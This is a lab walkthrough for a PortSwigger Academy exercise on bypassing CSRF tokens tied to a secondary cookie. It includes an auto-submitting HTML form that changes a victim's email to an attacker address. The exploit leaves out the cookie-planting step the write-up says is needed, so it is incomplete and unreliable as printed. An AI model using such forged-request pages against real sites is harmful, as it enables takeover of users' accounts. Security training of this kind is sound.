# Lab: CSRF where token is tied to non-session cookie

**Difficulty:** Practitioner  
**Category:** Cross-Site Request Forgery (CSRF)  
**Lab URL:** [PortSwigger Web Security Academy](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-tied-to-non-session-cookie)

## 🎯 Objective
Bypass CSRF protection where the token is tied to a secondary (non-session) cookie.

## 📖 Description
The application attempts to protect against CSRF using a token. However, the token is validated against a secondary cookie instead of the main session cookie. This design flaw allows an attacker to exploit it if they can control or set that secondary cookie.

## 🔍 Vulnerability Analysis

- **Vulnerable Endpoint**: `POST /my-account/change-email`
- **Weakness**: Token is bound to another cookie (e.g. `csrfKey` or similar) rather than the primary session cookie.
- **Bypass Technique**: Set or leak the secondary cookie + use a matching token.

## 🛠️ How to Solve (Step by Step)

1. Log in and capture a normal email change request.
2. Observe that there is a `csrf` token **and** another cookie (usually named `csrfKey` or similar).
3. The server validates that the token matches the value in the secondary cookie.
4. Craft an exploit that sets the secondary cookie and sends the matching token.
5. Deliver the exploit to the victim.

## 💥 Exploit Code (Example)

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>CSRF Exploit - Non-Session Cookie</title>
</head>
<body>
    <form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
        <input type="hidden" name="email" value="hacker@evil.com">
        <input type="hidden" name="csrf" value="PASTE-VALID-TOKEN-HERE">
    </form>

    <script>
        // Some labs require setting the secondary cookie via document.cookie or meta
        document.forms[0].submit();
    </script>
</body>
</html>
```
🚀 Delivery
Upload to Exploit Server → Deliver to victim.
⚡ Impact

The protection can be bypassed if the attacker can control the secondary cookie.
This is a common mistake when implementing custom CSRF protection.

🛡️ Prevention

Always tie CSRF tokens to the main session cookie.
Avoid using additional cookies for token validation unless they are properly protected (HttpOnly + SameSite=Strict).
Use established frameworks/libraries for anti-CSRF.

🔬 Key Learning Points

CSRF tokens must be bound to the primary authenticated session.
Using multiple cookies for validation increases complexity and risk of misconfiguration.
Always test your anti-CSRF implementation against common bypass techniques.
